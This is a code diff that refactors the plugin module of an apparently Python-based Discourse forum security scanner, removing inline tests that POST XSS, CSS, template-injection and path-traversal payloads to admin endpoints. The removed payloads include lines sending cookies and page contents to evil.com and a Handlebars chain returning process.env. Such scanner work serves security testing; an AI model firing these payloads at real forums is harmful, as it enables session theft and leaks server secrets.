@@ -5,13 +5,9 @@ Discourse Security Scanner - Plugin Security Module
 Tests security issues in Discourse plugins and themes
 """
 
-import re
-import time
-import json
-import base64
-from urllib.parse import urljoin, quote
-from bs4 import BeautifulSoup
-from ...lib.discourse_utils import extract_csrf_token
+from .plugin_discovery import PluginDiscovery
+from .plugin_security_tests import PluginSecurityTests
+
 
 class PluginModule:
     """Plugin security testing module for Discourse forums"""
@@ -31,459 +27,40 @@ class PluginModule:
             'theme_injection': []
         }
         
+        # Initialize sub-modules
+        self.discovery = PluginDiscovery(scanner)
+        self.security_tests = PluginSecurityTests(scanner)
+        
     def run(self):
-        """Run plugin security testing module (main entry point)"""
-        return self.run_scan()
-    
-    def run_scan(self):
-        """Run complete plugin security scan"""
-        print(f"\n{self.scanner.colors['info']}[*] Starting plugin security scan...{self.scanner.colors['reset']}")
+        """Run plugin security testing module"""
+        self.scanner.log("Starting plugin security scan...", 'info')
         
-        # Plugin keşfi
-        self._discover_plugins()
+        # Phase 1: Discovery
+        self.results['plugins_found'] = self.discovery.discover_plugins()
+        self.results['themes_found'] = self.discovery.discover_themes()
         
-        # Theme keşfi
-        self._discover_themes()
+        # Phase 2: Security Testing
+        self.results['plugin_vulnerabilities'] = self.security_tests.test_plugin_vulnerabilities(
+            self.results['plugins_found']
+        )
+        self.results['theme_vulnerabilities'] = self.security_tests.test_theme_vulnerabilities(
+            self.results['themes_found']
+        )
         
-        # Plugin vulnerabilities
-        self._test_plugin_vulnerabilities()
+        # Phase 3: Additional Checks
+        self.results['outdated_plugins'] = self.security_tests.check_outdated_plugins(
+            self.results['plugins_found']
+        )
         
-        # Theme vulnerabilities
-        self._test_theme_vulnerabilities()
-        
-        # Outdated plugin check
-        self._check_outdated_plugins()
-        
-        # Tehlikeli izinler
-        self._check_dangerous_permissions()
-        
-        # Plugin vulnerability check
-        self._check_plugin_vulnerabilities()
-        
-        # Dosya erişim testleri
-        self._test_plugin_file_access()
-        
-        # Theme injection testleri
-        self._test_theme_injection()
+        # Generate summary
+        self._generate_summary()
         
         return self.results
     
-    def _discover_plugins(self):
-        """Discover installed plugins"""
-        print(f"{self.scanner.colors['info']}[*] Scanning installed plugins...{self.scanner.colors['reset']}")
+    def _generate_summary(self):
+        """Generate scan summary"""
+        total_plugins = len(self.results['plugins_found'])
+        total_themes = len(self.results['themes_found'])
+        total_vulns = len(self.results['plugin_vulnerabilities']) + len(self.results['theme_vulnerabilities'])
         
-        # Admin plugins sayfası
-        admin_plugins_url = urljoin(self.scanner.target_url, '/admin/plugins')
-        response = self.scanner.make_request(admin_plugins_url)
-        
-        if response and response.status_code == 200:
-            soup = BeautifulSoup(response.text, 'html.parser')
-            
-            # Plugin listesi
-            plugin_elements = soup.find_all('div', class_='admin-plugin-item')
-            for element in plugin_elements:
-                plugin_info = self._extract_plugin_info(element)
-                if plugin_info:
-                    self.results['plugins_found'].append(plugin_info)
-        
-        # API üzerinden plugin listesi
-        api_plugins_url = urljoin(self.scanner.target_url, '/admin/plugins.json')
-        response = self.scanner.make_request(api_plugins_url)
-        
-        if response and response.status_code == 200:
-            try:
-                data = response.json()
-                if 'plugins' in data:
-                    for plugin in data['plugins']:
-                        plugin_info = {
-                            'name': plugin.get('name', 'Unknown'),
-                            'version': plugin.get('version', 'Unknown'),
-                            'enabled': plugin.get('enabled', False),
-                            'url': plugin.get('url', ''),
-                            'author': plugin.get('author', 'Unknown')
-                        }
-                        self.results['plugins_found'].append(plugin_info)
-            except json.JSONDecodeError:
-                pass
-        
-        # Common plugin paths
-        common_plugins = [
-            'discourse-chat-integration',
-            'discourse-solved',
-            'discourse-voting',
-            'discourse-calendar',
-            'discourse-data-explorer',
-            'discourse-sitemap',
-            'discourse-oauth2-basic',
-            'discourse-saml',
-            'discourse-ldap-auth',
-            'discourse-akismet',
-            'discourse-math',
-            'discourse-spoiler-alert',
-            'discourse-checklist',
-            'discourse-assign'
-        ]
-        
-        for plugin in common_plugins:
-            plugin_url = urljoin(self.scanner.target_url, f'/plugins/{plugin}')
-            response = self.scanner.make_request(plugin_url)
-            
-            if response and response.status_code == 200:
-                self.results['plugins_found'].append({
-                    'name': plugin,
-                    'version': 'Unknown',
-                    'enabled': True,
-                    'detection_method': 'path_enumeration'
-                })
-    
-    def _discover_themes(self):
-        """Discover installed themes"""
-        print(f"{self.scanner.colors['info']}[*] Scanning installed themes...{self.scanner.colors['reset']}")
-        
-        # Admin themes sayfası
-        admin_themes_url = urljoin(self.scanner.target_url, '/admin/customize/themes')
-        response = self.scanner.make_request(admin_themes_url)
-        
-        if response and response.status_code == 200:
-            soup = BeautifulSoup(response.text, 'html.parser')
-            
-            # Theme listesi
-            theme_elements = soup.find_all('div', class_='theme-list-item')
-            for element in theme_elements:
-                theme_info = self._extract_theme_info(element)
-                if theme_info:
-                    self.results['themes_found'].append(theme_info)
-        
-        # API üzerinden theme listesi
-        api_themes_url = urljoin(self.scanner.target_url, '/admin/themes.json')
-        response = self.scanner.make_request(api_themes_url)
-        
-        if response and response.status_code == 200:
-            try:
-                data = response.json()
-                if 'themes' in data:
-                    for theme in data['themes']:
-                        theme_info = {
-                            'name': theme.get('name', 'Unknown'),
-                            'id': theme.get('id', 0),
-                            'default': theme.get('default', False),
-                            'user_selectable': theme.get('user_selectable', False),
-                            'color_scheme': theme.get('color_scheme', {})
-                        }
-                        self.results['themes_found'].append(theme_info)
-            except json.JSONDecodeError:
-                pass
-    
-    def _test_plugin_vulnerabilities(self):
-        """Test for plugin-specific vulnerabilities"""
-        print(f"{self.scanner.colors['info']}[*] Testing plugin vulnerabilities...{self.scanner.colors['reset']}")
-        
-        for plugin in self.results['plugins_found']:
-            plugin_name = plugin.get('name', '')
-            
-            # Known vulnerable plugins
-            vulnerable_plugins = {
-                'discourse-chat-integration': ['XSS via webhook', 'SSRF via external API'],
-                'discourse-data-explorer': ['SQL Injection', 'Information Disclosure'],
-                'discourse-oauth2-basic': ['Authentication Bypass', 'Token Leakage'],
-                'discourse-saml': ['XML External Entity', 'Authentication Bypass'],
-                'discourse-ldap-auth': ['LDAP Injection', 'Authentication Bypass']
-            }
-            
-            if plugin_name in vulnerable_plugins:
-                for vuln in vulnerable_plugins[plugin_name]:
-                    self.results['plugin_vulnerabilities'].append({
-                        'plugin': plugin_name,
-                        'vulnerability': vuln,
-                        'severity': 'High',
-                        'description': f'{vuln} vulnerability in {plugin_name}'
-                    })
-            
-            # Test plugin endpoints
-            self._test_plugin_endpoints(plugin_name)
-    
-    def _test_theme_vulnerabilities(self):
-        """Test for theme-specific vulnerabilities"""
-        print(f"{self.scanner.colors['info']}[*] Testing theme vulnerabilities...{self.scanner.colors['reset']}")
-        
-        for theme in self.results['themes_found']:
-            theme_id = theme.get('id', 0)
-            theme_name = theme.get('name', '')
-            
-            # Test theme CSS injection
-            self._test_theme_css_injection(theme_id, theme_name)
-            
-            # Test theme JS injection
-            self._test_theme_js_injection(theme_id, theme_name)
-            
-            # Test theme template injection
-            self._test_theme_template_injection(theme_id, theme_name)
-    
-    def _test_plugin_endpoints(self, plugin_name):
-        """Test plugin-specific endpoints"""
-        plugin_endpoints = {
-            'discourse-chat-integration': ['/chat-integration/webhook', '/chat-integration/admin'],
-            'discourse-data-explorer': ['/admin/plugins/explorer', '/admin/plugins/explorer/queries'],
-            'discourse-calendar': ['/calendar', '/calendar/events'],
-            'discourse-voting': ['/voting', '/voting/vote']
-        }
-        
-        if plugin_name in plugin_endpoints:
-            for endpoint in plugin_endpoints[plugin_name]:
-                url = urljoin(self.scanner.target_url, endpoint)
-                response = self.scanner.make_request(url)
-                
-                if response:
-                    if response.status_code == 200:
-                        # Check for sensitive information
-                        if any(keyword in response.text.lower() for keyword in ['password', 'token', 'secret', 'key']):
-                            self.results['plugin_vulnerabilities'].append({
-                                'plugin': plugin_name,
-                                'endpoint': endpoint,
-                                'vulnerability': 'Information Disclosure',
-                                'severity': 'Medium',
-                                'description': f'Sensitive information exposed at {endpoint}'
-                            })
-    
-    def _check_plugin_vulnerabilities(self):
-        """Check for plugin vulnerabilities using vulnerability database"""
-        print(f"{self.scanner.colors['info']}[*] Checking plugin vulnerabilities...{self.scanner.colors['reset']}")
-        
-        try:
-            from .plugin_vuln_db import PluginVulnDB
-            vuln_db = PluginVulnDB()
-            
-            for plugin in self.results['plugins_found']:
-                plugin_name = plugin.get('name', '')
-                plugin_version = plugin.get('version', '')
-                
-                # Check if plugin has known vulnerabilities
-                vulnerabilities = vuln_db.get_plugin_vulnerabilities(plugin_name)
-                
-                if vulnerabilities:
-                    for vuln in vulnerabilities:
-                        self.results['plugin_vulnerabilities'].append({
-                            'plugin': plugin_name,
-                            'vulnerability': vuln.get('title', 'Unknown'),
-                            'severity': vuln.get('severity', 'Medium'),
-                            'cve': vuln.get('cve', ''),
-                            'description': vuln.get('description', 'No description available'),
-                            'affected_versions': vuln.get('affected_versions', []),
-                            'source': 'vulnerability_database'
-                        })
-                        
-        except ImportError:
-            self.scanner.log("Plugin vulnerability database not available", 'warning')
-    
-    def _test_theme_css_injection(self, theme_id, theme_name):
-        """Test for CSS injection in themes"""
-        css_payloads = [
-            'body{background:url("javascript:alert(1)");}',
-            '@import "javascript:alert(1)";',
-            'body{-moz-binding:url("data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22http://www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Balert(1)%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/binding%3E%3C/bindings%3E");}',
-            'body{background:url("data:text/html,<script>alert(1)</script>");}']
-        
-        for payload in css_payloads:
-            # Test CSS upload/modification
-            css_url = urljoin(self.scanner.target_url, f'/admin/themes/{theme_id}/css')
-            data = {'css': payload}
-            response = self.scanner.make_request(css_url, method='POST', data=data)
-            
-            if response and 'success' in response.text.lower():
-                self.results['theme_vulnerabilities'].append({
-                    'theme': theme_name,
-                    'vulnerability': 'CSS Injection',
-                    'severity': 'High',
-                    'payload': payload,
-                    'description': 'CSS injection possible in theme customization'
-                })
-    
-    def _test_theme_js_injection(self, theme_id, theme_name):
-        """Test for JavaScript injection in themes"""
-        js_payloads = [
-            'alert("XSS")',
-            'document.location="http://evil.com/"+document.cookie',
-            'fetch("/admin/users.json").then(r=>r.json()).then(d=>console.log(d))',
-            'new Image().src="http://evil.com/steal?"+btoa(document.body.innerHTML)'
-        ]
-        
-        for payload in js_payloads:
-            # Test JS upload/modification
-            js_url = urljoin(self.scanner.target_url, f'/admin/themes/{theme_id}/javascript')
-            data = {'javascript': payload}
-            response = self.scanner.make_request(js_url, method='POST', data=data)
-            
-            if response and 'success' in response.text.lower():
-                self.results['theme_vulnerabilities'].append({
-                    'theme': theme_name,
-                    'vulnerability': 'JavaScript Injection',
-                    'severity': 'Critical',
-                    'payload': payload,
-                    'description': 'JavaScript injection possible in theme customization'
-                })
-    
-    def _test_theme_template_injection(self, theme_id, theme_name):
-        """Test for template injection in themes"""
-        template_payloads = [
-            '{{constructor.constructor("alert(1)")()}}',
-            '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return JSON.stringify(process.env);"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
-            '{{{constructor.constructor("alert(1)")()}}}',
-            '{{lookup (lookup this "constructor") "constructor"}}'
-        ]
-        
-        for payload in template_payloads:
-            # Test template modification
-            template_url = urljoin(self.scanner.target_url, f'/admin/themes/{theme_id}/templates')
-            data = {'template': payload}
-            response = self.scanner.make_request(template_url, method='POST', data=data)
-            
-            if response and 'success' in response.text.lower():
-                self.results['theme_vulnerabilities'].append({
-                    'theme': theme_name,
-                    'vulnerability': 'Template Injection',
-                    'severity': 'Critical',
-                    'payload': payload,
-                    'description': 'Server-side template injection possible in theme templates'
-                })
-    
-    def _check_outdated_plugins(self):
-        """Check for outdated plugins"""
-        print(f"{self.scanner.colors['info']}[*] Checking for outdated plugins...{self.scanner.colors['reset']}")
-        
-        # Known vulnerable versions
-        vulnerable_versions = {
-            'discourse-chat-integration': ['1.0.0', '1.1.0'],
-            'discourse-data-explorer': ['0.1.0', '0.2.0'],
-            'discourse-oauth2-basic': ['1.0.0'],
-            'discourse-saml': ['1.0.0', '1.1.0']
-        }
-        
-        for plugin in self.results['plugins_found']:
-            plugin_name = plugin.get('name', '')
-            plugin_version = plugin.get('version', '')
-            
-            if plugin_name in vulnerable_versions:
-                if plugin_version in vulnerable_versions[plugin_name]:
-                    self.results['outdated_plugins'].append({
-                        'plugin': plugin_name,
-                        'current_version': plugin_version,
-                        'vulnerability': 'Outdated Version',
-                        'severity': 'High',
-                        'description': f'{plugin_name} version {plugin_version} has known vulnerabilities'
-                    })
-    
-    def _check_dangerous_permissions(self):
-        """Check for dangerous plugin permissions"""
-        print(f"{self.scanner.colors['info']}[*] Checking dangerous plugin permissions...{self.scanner.colors['reset']}")
-        
-        dangerous_permissions = [
-            'file_system_access',
-            'database_access',
-            'admin_privileges',
-            'user_impersonation',
-            'external_requests'
-        ]
-        
-        for plugin in self.results['plugins_found']:
-            plugin_name = plugin.get('name', '')
-            
-            # Check plugin manifest for permissions
-            manifest_url = urljoin(self.scanner.target_url, f'/plugins/{plugin_name}/plugin.rb')
-            response = self.scanner.make_request(manifest_url)
-            
-            if response and response.status_code == 200:
-                for permission in dangerous_permissions:
-                    if permission in response.text.lower():
-                        self.results['dangerous_permissions'].append({
-                            'plugin': plugin_name,
-                            'permission': permission,
-                            'severity': 'High',
-                            'description': f'{plugin_name} has dangerous permission: {permission}'
-                        })
-    
-    def _test_plugin_file_access(self):
-        """Test plugin file access vulnerabilities"""
-        print(f"{self.scanner.colors['info']}[*] Testing plugin file access vulnerabilities...{self.scanner.colors['reset']}")
-        
-        file_access_paths = [
-            '/plugins/../../etc/passwd',
-            '/plugins/../../../etc/passwd',
-            '/plugins/..\\..\\windows\\system32\\drivers\\etc\\hosts',
-            '/plugins/%2e%2e%2f%2e%2e%2fetc%2fpasswd',
-            '/plugins/....//....//etc/passwd'
-        ]
-        
-        for path in file_access_paths:
-            url = urljoin(self.scanner.target_url, path)
-            response = self.scanner.make_request(url)
-            
-            if response and response.status_code == 200:
-                if any(keyword in response.text.lower() for keyword in ['root:', 'daemon:', 'bin:', 'sys:']):
-                    self.results['plugin_file_access'].append({
-                        'path': path,
-                        'vulnerability': 'Directory Traversal',
-                        'severity': 'Critical',
-                        'description': f'File system access possible via {path}'
-                    })
-    
-    def _test_theme_injection(self):
-        """Test theme injection vulnerabilities"""
-        print(f"{self.scanner.colors['info']}[*] Testing theme injection vulnerabilities...{self.scanner.colors['reset']}")
-        
-        injection_payloads = [
-            '<script>alert("XSS")</script>',
-            '{{constructor.constructor("alert(1)")()}}',
-            '${alert("XSS")}',
-            '#{alert("XSS")}',
-            '<img src=x onerror=alert("XSS")>'
-        ]
-        
-        for theme in self.results['themes_found']:
-            theme_id = theme.get('id', 0)
-            
-            for payload in injection_payloads:
-                # Test theme settings injection
-                settings_url = urljoin(self.scanner.target_url, f'/admin/themes/{theme_id}/settings')
-                data = {'setting_value': payload}
-                response = self.scanner.make_request(settings_url, method='POST', data=data)
-                
-                if response and 'success' in response.text.lower():
-                    self.results['theme_injection'].append({
-                        'theme_id': theme_id,
-                        'vulnerability': 'Theme Settings Injection',
-                        'severity': 'High',
-                        'payload': payload,
-                        'description': 'Code injection possible via theme settings'
-                    })
-    
-    def _extract_plugin_info(self, element):
-        """Extract plugin information from HTML element"""
-        try:
-            name = element.find('h3').text.strip() if element.find('h3') else 'Unknown'
-            version = element.find('span', class_='version').text.strip() if element.find('span', class_='version') else 'Unknown'
-            enabled = 'enabled' in element.get('class', [])
-            
-            return {
-                'name': name,
-                'version': version,
-                'enabled': enabled,
-                'detection_method': 'admin_page'
-            }
-        except:
-            return None
-    
-    def _extract_theme_info(self, element):
-        """Extract theme information from HTML element"""
-        try:
-            name = element.find('h4').text.strip() if element.find('h4') else 'Unknown'
-            theme_id = element.get('data-theme-id', 0)
-            default = 'default' in element.get('class', [])
-            
-            return {
-                'name': name,
-                'id': int(theme_id) if theme_id else 0,
-                'default': default,
-                'detection_method': 'admin_page'
-            }
-        except:
-            return None
+        self.scanner.log(f"Plugin scan complete: {total_plugins} plugins, {total_themes} themes, {total_vulns} vulnerabilities found", 'success')
